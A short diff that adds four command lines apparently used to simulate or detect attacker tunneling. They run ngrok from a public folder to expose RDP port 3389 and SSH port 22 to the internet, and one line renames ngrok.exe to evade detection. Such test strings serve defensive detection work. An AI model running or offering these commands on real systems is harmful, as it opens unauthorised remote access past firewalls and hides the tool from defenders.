@@ -1,0 +1,4 @@
+"powershell.exe" & {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null Start-Sleep -s 5  Stop-Job -Name Job1 | Out-Null}
+ngrok.exe start --config ./config.yml
+ngrok.exe tcp 22
+ren ngrok.exe tunneling.exe && tunneling.exe start --none
